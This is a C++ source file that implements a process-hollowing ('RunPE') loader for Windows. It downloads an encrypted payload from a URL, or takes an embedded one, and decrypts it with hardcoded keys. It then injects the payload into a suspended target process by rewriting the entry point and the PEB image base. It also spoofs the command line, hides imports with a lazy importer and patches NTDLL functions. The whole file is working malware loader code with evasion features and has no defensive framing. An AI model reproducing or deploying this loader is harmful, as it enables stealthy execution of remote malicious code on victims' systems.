#include "run_pe.h"

#include <iostream>
#include "patch_ntdll.h"
#include "pe_helper.h"
#include "relocate.h"
#include "pe_hdrs_helper.h"
#include "buffer_util.h"
#include "pe_loader.h"
#include "file_util.h"
#include "resource.h"
#include "lib/lazy_importer.hpp"
#include <winternl.h>
#include <string>
#include <tchar.h>
#include "common_util.h"


extern bool g_PatchRequired;

typedef NTSTATUS(WINAPI * NtQueryInformationProcess_t)(
 IN HANDLE,
 IN PROCESSINFOCLASS,
 OUT PVOID,
 IN ULONG,
 OUT PULONG
 );



void* readProcessMemory(HANDLE process, void* address, DWORD bytes) {
 SIZE_T bytesRead;
 char* alloc;

 alloc = (char*)malloc(bytes);
 if (alloc == NULL) {
  return NULL;
 }

 if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
  free(alloc);
  return NULL;
 }

 return alloc;
}

BOOL writeProcessMemory(HANDLE process, void* address, void* data, DWORD bytes) {
 SIZE_T bytesWritten;

 if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
  return false;
 }

 return true;
}



LPTSTR GenerateAString(int x) {
    // Allocate memory for x A's + null terminator
    LPTSTR buffer = (LPTSTR)LocalAlloc(LPTR, (x + 1) * sizeof(TCHAR));
    if (buffer == NULL) {
        std::cerr << "Memory allocation failed!" << std::endl;
        return NULL;
    }

    // Fill buffer with 'A'
    for (int i = 0; i < x; ++i) {
        buffer[i] = _T('A');
    }
    buffer[0]  = _T(' ');
    

    return buffer;
}

bool create_suspended_process(IN LPCTSTR path, IN LPCTSTR cmdLine, OUT PROCESS_INFORMATION &pi)
{
    STARTUPINFOA si = { 0 };
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    SIZE_T bytesRead = 0, bytesWritten = 0;
    BOOL success;
    PEB pebLocal = { 0 };
    RTL_USER_PROCESS_PARAMETERS* parameters = nullptr;

    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    //LPTSTR fake_cmd = GenerateAString(sizeof(cmdLine));

    // Use CMD_TO_SHOW as a fake command line
    if (!LI_FN(CreateProcessA)(
        path,
        (LPSTR)cmdLine,
        nullptr,
        nullptr,
        FALSE,
        CREATE_SUSPENDED,
        nullptr,
        "C:\\Windows\\System32",
        &si,
        &pi))
    {
        std::cerr << "[ERROR] CreateProcess failed, Error = " << std::hex << GetLastError() << "\n";
        return false;
    }

    // Get NtQueryInformationProcess
    auto NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        std::cerr << "[ERROR] Failed to get NtQueryInformationProcess\n";
        return false;
    }

    // Get PEB
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr) != 0) {
        std::cerr << "[ERROR] NtQueryInformationProcess failed\n";
        return false;
    }

    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead)) {
        std::cerr << "[ERROR] Failed to read remote PEB\n";
        return false;
    }

    // Read the ProcessParameters
    parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
        pi.hProcess,
        pebLocal.ProcessParameters,
        sizeof(RTL_USER_PROCESS_PARAMETERS) + 512 // add padding
    );

    if (!parameters) {
        std::cerr << "[ERROR] Failed to read remote process parameters\n";
        return false;
    }

    // Spoofed command line
    // std::wstring wSpoofed = CMD_TO_EXEC;
    // USHORT newLen = (USHORT)(wSpoofed.length() * sizeof(WCHAR));
    // USHORT newMaxLen = newLen + sizeof(WCHAR);

    // split CMD line so that can get process.exe name and set to newUnicodeLen



    DWORD newUnicodeLen = splitFirstSpace(cmdLine);
    std::cout << "newUnicodeLen: " << newUnicodeLen << std::endl;
    DWORD UniCodeLenNew = newUnicodeLen * 2;
    // Update Length
    if (!WriteProcessMemory(pi.hProcess,
        (PBYTE)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &UniCodeLenNew, 4, &bytesWritten)) {
        std::cerr << "[ERROR] Failed to update CommandLine.Length\n";
        return false;
    }



    std::wcout << L"[+] Process PID: " << pi.dwProcessId << std::endl;

    // Success
    return true;
}

bool terminate_process(DWORD pid)
{
    bool is_killed = false;
    HANDLE hProcess = LI_FN(OpenProcess)(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        return false;
    }
    if (LI_FN(TerminateProcess)(hProcess, 0)) {
        is_killed = true;
    }
    else {
        std::cerr << "[ERROR] Could not terminate the process. PID = " << std::dec << pid << std::endl;
    }
    LI_FN(CloseHandle)(hProcess);
    return is_killed;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!LI_FN(ReadProcessMemory)(hProcess, LPVOID(remote_addr), buffer, buffer_size, nullptr)) {
        std::cerr << "[ERROR] Cannot read from the remote memory!\n";
        return false;
    }
    return true;
}

BOOL update_remote_entry_point(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va, bool is32bit)
{
#ifdef _DEBUG
    std::cout << "Writing new EP: " << std::hex << entry_point_va << std::endl;
#endif
#if defined(_WIN64)
    if (is32bit) {
        // The target is a 32 bit executable while the loader is 64bit,
        // so, in order to access the target we must use Wow64 versions of the functions:

        // 1. Get initial context of the target:
        WOW64_CONTEXT context = { 0 };
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            return FALSE;
        }
        // 2. Set the new Entry Point in the context:
        context.Eax = static_cast<DWORD>(entry_point_va);

        // 3. Set the changed context into the target:
        return Wow64SetThreadContext(pi.hThread, &context);
    }
#endif
    // 1. Get initial context of the target:
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return FALSE;
    }
    // 2. Set the new Entry Point in the context:
#if defined(_M_AMD64)
    context.Rcx = entry_point_va;
#elif defined(_M_ARM64)
    context.X23 = entry_point_va;
#else
    context.Eax = static_cast<DWORD>(entry_point_va);
#endif
    // 3. Set the changed context into the target:
    return SetThreadContext(pi.hThread, &context);
}

ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi, bool is32bit)
{
#if defined(_WIN64)
    if (is32bit) {
        //get initial context of the target:
        WOW64_CONTEXT context;
        memset(&context, 0, sizeof(WOW64_CONTEXT));
        context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(pi.hThread, &context)) {
            printf("Wow64 cannot get context!\n");
            return 0;
        }
        //get remote PEB from the context
        return static_cast<ULONGLONG>(context.Ebx);
    }
#endif
    ULONGLONG PEB_addr = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &context)) {
        return 0;
    }
#if defined(_M_AMD64)
    PEB_addr = context.Rdx;
#elif defined(_M_ARM64)
    PEB_addr = context.X23;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}
inline ULONGLONG get_img_base_peb_offset(bool is32bit)
{
/*
We calculate this offset in relation to PEB,
that is defined in the following way
(source "ntddk.h"):

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace; // size: 1
    BOOLEAN ReadImageFileExecOptions; // size : 1
    BOOLEAN BeingDebugged; // size : 1
    BOOLEAN SpareBool; // size : 1
                    // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
    HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit
                   
    PVOID ImageBaseAddress;
    [...]
    */
    ULONGLONG img_base_offset = is32bit ? 
        sizeof(DWORD) * 2
        : sizeof(ULONGLONG) * 2;

    return img_base_offset;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, bool is32bit)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    //2. Write the new Entry Point into context of the remote process:
    if (update_remote_entry_point(pi, ep_va, is32bit) == FALSE) {
        std::cerr << "Cannot update remote EP!\n";
        return false;
    }
    //3. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi, is32bit);
    if (!remote_peb_addr) {
        std::cerr << "Failed getting remote PEB address!\n";
        return false;
    }
    // get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + get_img_base_peb_offset(is32bit));
    

    //calculate size of the field (depends on architecture):
    const size_t img_base_size = is32bit ? sizeof(DWORD) : sizeof(ULONGLONG);

    SIZE_T written = 0;
    //4. Write the payload's ImageBase into remote process' PEB:
    if (!LI_FN(WriteProcessMemory)(pi.hProcess, remote_img_base,
        &load_base, img_base_size, 
        &written)) 
    {
        std::cerr << "Cannot update ImageBaseAddress!\n";
        return false;
    }

    return true;
}

bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi, bool is32bit)
{

    if (loaded_pe == NULL) return false;


    //getchar();

    //1. Allocate memory for the payload in the remote process:
    LPVOID remoteBase = LI_FN(VirtualAllocEx)(pi.hProcess, nullptr, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBase == NULL)  {
        std::cerr << "Could not allocate memory in the remote process\n";
        return false;
    }

    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast<ULONG>(payloadImageSize));

    //2. Relocate the payload (local copy) to the Remote Base:
    if (!relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteBase)) {
        std::cout << "Could not relocate the module!\n";
        return false;
    }
    //3. Update the image base of the payload (local copy) to the Remote Base:
    update_image_base(loaded_pe, (ULONGLONG) remoteBase);

    //4. Write the payload to the remote process, at the Remote Base:
    SIZE_T written = 0;
    if (!LI_FN(WriteProcessMemory)(pi.hProcess, remoteBase, loaded_pe, payloadImageSize, &written)) {
        std::cout << "Writing to the remote process failed!\n";
        return false;
    }

    printf("Loaded at: %p\n", remoteBase);

    //5. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
    if (!redirect_to_payload(loaded_pe, remoteBase, pi, is32bit)) {
        std::cerr << "Redirecting failed!\n";
        return false;
    }
    if (!is32bit && g_PatchRequired && !patch_ZwQueryVirtualMemory(pi.hProcess, remoteBase)) {
        std::cout << "ERROR: failed to apply the required patch on NTDLL\n";
    }
    
   
    std::cout << "Resuming the process: " << std::dec << pi.dwProcessId << std::endl;
    //6. Resume the thread and let the payload run:
    

    LI_FN(ResumeThread)(pi.hThread);
    return true;
}

bool is_target_compatibile(BYTE *payload_buf, size_t payload_size, LPCTSTR targetPath)
{
    if (!payload_buf) {
        return false;
    }
    const WORD payload_subs = get_subsystem(payload_buf);

    size_t target_size = 0;

    BYTE* target_pe = load_pe_module(targetPath, target_size, false, false);
    if (!target_pe) {
        return false;
    }
    const WORD target_subs = get_subsystem(target_pe);
    const bool is64bit_target = is64bit(target_pe);
    free_pe_buffer(target_pe); target_pe = NULL; target_size = 0;

    if (is64bit_target != is64bit(payload_buf)) {
        std::cerr << "Incompatibile target bitness!\n";
        return false;
    }
    if (payload_subs != IMAGE_SUBSYSTEM_WINDOWS_GUI //only a payload with GUI subsystem can be run by both GUI and CLI
        && target_subs != payload_subs)
    {
        std::cerr << "Incompatibile target subsystem!\n";
        return false;
    }
    return true;
}



bool run_pe(IN LPCTSTR payloadPath, IN LPTSTR targetPath, IN LPCTSTR cmdLine)
{
    //1. Load the payload:
    size_t payloadImageSize = 0;
   
    printf("Full URL: %s\n", payloadPath);

    std::pair<std::string, std::string> splitURL = parseURL(payloadPath);
    printf("First: %s\n", splitURL.first.c_str());
    printf("Second: %s\n", splitURL.second.c_str());
    BYTE* resourceBytes = buffer_payload_from_url(splitURL.first.c_str(), splitURL.second.c_str(), payloadImageSize, "LoveAllingUnitofLAWniUUXUUXVVXV", "");

    BYTE* loaded_pe = load_pe_module(resourceBytes, payloadImageSize, payloadImageSize, false, false, get_image_base(resourceBytes));

    if (!loaded_pe) {
        std::cerr << "Loading failed!\n";
        return false;
    }
    // Get the payload's architecture and check if it is compatibile with the loader:
    const WORD payload_arch = get_nt_hdr_architecture(loaded_pe);
    if (payload_arch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payload_arch != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Not supported paylad architecture!\n";
        return false;
    }
    const bool is32bit_payload = !is64bit(loaded_pe);
#ifndef _WIN64
    if (!is32bit_payload) {
        std::cerr << "Incompatibile payload architecture!\n"
            << "Only 32 bit payloads can be injected from 32bit loader!\n";
        return false;
    }
#endif
    // 2. Prepare the taget
    if (targetPath == NULL) {
        std::cerr << "No target supplied!\n";
        return false;
    }
    if (!is_target_compatibile(loaded_pe, payloadImageSize, targetPath)) {
        free_pe_buffer(loaded_pe, payloadImageSize);
        return false;
    }
    // Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_suspended_process(targetPath, cmdLine, pi);
    if (!is_created) {
        std::cerr << "Creating target process failed!\n";
        free_pe_buffer(loaded_pe, payloadImageSize);
        return false;
    }


    if (g_PatchRequired) {
#ifndef _WIN64
        patch_NtManageHotPatch32(pi.hProcess);
#else
        patch_NtManageHotPatch64(pi.hProcess);
#endif
    }
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadImageSize, pi, is32bit_payload);
    //4. Cleanup:
    if (!isOk) { //if injection failed, kill the process
        terminate_process(pi.dwProcessId);
    }
    free_pe_buffer(loaded_pe, payloadImageSize);
    LI_FN(CloseHandle)(pi.hThread);
    LI_FN(CloseHandle)(pi.hProcess);
    //---
    return isOk;
}


bool run_pe_bytes(IN BYTE* payloadData, IN size_t payloadSize, IN LPTSTR targetPath, IN LPCTSTR cmdLine, IN BOOL isEncrypted) {

    BYTE* loaded_pe = NULL;
    if (isEncrypted) {
        //printf("Decrypting payload\n");
        std::string iv = (std::string)("freediddybummynz");
      BYTE* decryptedData = DecryptResourceBuffer(payloadData, payloadSize, "LoveAllingUnitofLAWniUUXUUXVVXV", iv, payloadSize);
         loaded_pe = load_pe_module(decryptedData, payloadSize, payloadSize, false, false, get_image_base(decryptedData));
    }else{
        loaded_pe = load_pe_module(payloadData, payloadSize, payloadSize, false, false, get_image_base(payloadData));
    }
    
   

    printf("Loaded at: %p\n", loaded_pe);
    printf("Payload size: %d\n", payloadSize);


    if (!loaded_pe) {
        std::cerr << "Loading failed!\n";
        return false;
    }
    // Get the payload's architecture and check if it is compatibile with the loader:
    const WORD payload_arch = get_nt_hdr_architecture(loaded_pe);
    if (payload_arch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payload_arch != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Not supported paylad architecture!\n";
        return false;
    }
    const bool is32bit_payload = !is64bit(loaded_pe);
#ifndef _WIN64
    if (!is32bit_payload) {
        std::cerr << "Incompatibile payload architecture!\n"
            << "Only 32 bit payloads can be injected from 32bit loader!\n";
        return false;
    }
#endif
    // 2. Prepare the taget
    if (targetPath == NULL) {
        std::cerr << "No target supplied!\n";
        return false;
    }
    if (!is_target_compatibile(loaded_pe, payloadSize, targetPath)) {
        free_pe_buffer(loaded_pe, payloadSize);
        return false;
    }
    // Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_suspended_process(targetPath, cmdLine, pi);
    if (!is_created) {
        std::cerr << "Creating target process failed!\n";
        free_pe_buffer(loaded_pe, payloadSize);
        return false;
    }
    printf("Pi id: %d\n", pi.dwProcessId);
    if (g_PatchRequired) {
#ifndef _WIN64
        patch_NtManageHotPatch32(pi.hProcess);
#else
        patch_NtManageHotPatch64(pi.hProcess);
#endif
    }
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadSize, pi, is32bit_payload);
    
    //4. Cleanup:
    if (!isOk) { //if injection failed, kill the process
        terminate_process(pi.dwProcessId);
    }
    free_pe_buffer(loaded_pe, payloadSize);
    LI_FN(CloseHandle)(pi.hThread);
    LI_FN(CloseHandle)(pi.hProcess);
    //---


    return isOk;

}
